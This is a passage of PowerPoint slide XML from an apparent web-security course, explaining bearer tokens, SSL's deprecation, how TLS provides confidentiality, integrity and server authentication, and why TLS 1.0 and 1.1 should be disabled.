            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>There is no built-in memory of “who you are” or “what you did before”.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>All state (sessions, tokens, flows) is something </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>you</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> design and secure.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Security implications</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Cookies/tokens are bearer credentials – protect them!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Replay, CSRF, caching, and “internal-only” assumptions all stem from improper handling of authenticated state and trust boundaries.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20826449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8ECFC-AA34-64BA-5685-B076E435D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37983-8255-A9F3-5110-C592057CC65E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - HTTP Security - SSL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E50FD35-26E3-0760-0ECC-E63AB1B52E88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4276482"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Secure Sockets Layer (SSL) == DDD:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Deprecated</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Dead</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Don't use it!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="383369754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6EA4-741A-BAE9-400B-A959939E0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183EB-1C31-E0D2-D322-D3CB047CA891}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTP Security - TLS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF4C099B-F057-5D8E-2383-F87C09DD04A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4276482"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Transport Layer Security (TLS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>cryptographic protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> that sits between an application and TCP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TLS enforces CIA over untrusted networks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – encrypt the data so eavesdroppers can’t read it</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – detect if data is modified in transit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – typically prove the server’s identity to the client using certificates; optionally authenticate the client too</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="211028859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809A-1BF8-BB8B-B5A6-0059BA192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50E93-A081-3957-BD59-80918B224CE4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS for Confidentiality</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{641AE88B-0A04-86D4-A1BA-F3BB609F14AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4276482"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Both sides use an asymmetric key exchange (usually ECDHE) to derive a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>shared symmetric key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Data is symmetrically encrypted with shared key before being transported</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38871828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8053-3368-7F64-87F7-3EF111363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C7195-D60B-BA18-6621-207CC8CB2179}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS for Integrity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E6CE328-28A4-44CC-A1D6-86D65CB1FAF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4276482"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>HMAC-SHA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (e.g., HMAC-SHA256) to make sure data isn’t modified in transit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>When your browser and the server exchange application data (like HTTP), they attach an HMAC over the data using SHA + a secret key.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The receiver recomputes the HMAC; if it matches, the data is assumed intact.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33267954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DBE2-8C15-1D04-685C-33FE6092E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7466D-16AB-160A-011B-E8C89FC4F5D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS for Authentication</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{718478F0-A6F0-CAA1-FC2A-D19B7ABABB33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8315555" cy="5144807"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The client starts with a '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ClientHello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> with its supported algorithms and a random value.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The server replies with a '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ServerHello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, its certificate chain (containing its public key), and key-exchange parameters.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The client validates the server certificate (trusted CA, hostname matches, not expired/revoked, etc.).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The server proves it owns the private key by sending a digital signature over parts of the handshake (including the random values).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The client verifies this signature using the public key from the certificate</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="317111477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07323-9E18-580E-3AD6-78D7DF044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EBDDC-6CC9-1E8B-5779-DDB1AD4EB453}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS 1.0 (1999) &amp; 1.1 (2006)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF2E8F89-BB22-09AB-86D3-99EE61CC0273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7899114" cy="4639760"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS versions 1.0 and 1.1 are deprecated due to a variety of issues:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Outdated algorithms and weak cipher suites</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Courier New"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>3DES, RC4, and SHA-1 are either weak or fully broken in practice.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>CBC-mode design problems</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Courier New"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Attacks like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>BEAST,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Lucky13</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> exploit how TLS 1.0 uses CBC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No AEAD cipher suites</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Courier New"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Only “MAC-then-Encrypt” constructions like AES-CBC + HMAC, which are fragile and hard to implement securely.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Disable both</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42817834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10CE9-25A6-A45C-8EDB-BF4FE3B7B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6189C-6178-7ECA-5BD7-B2974C9D2F1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
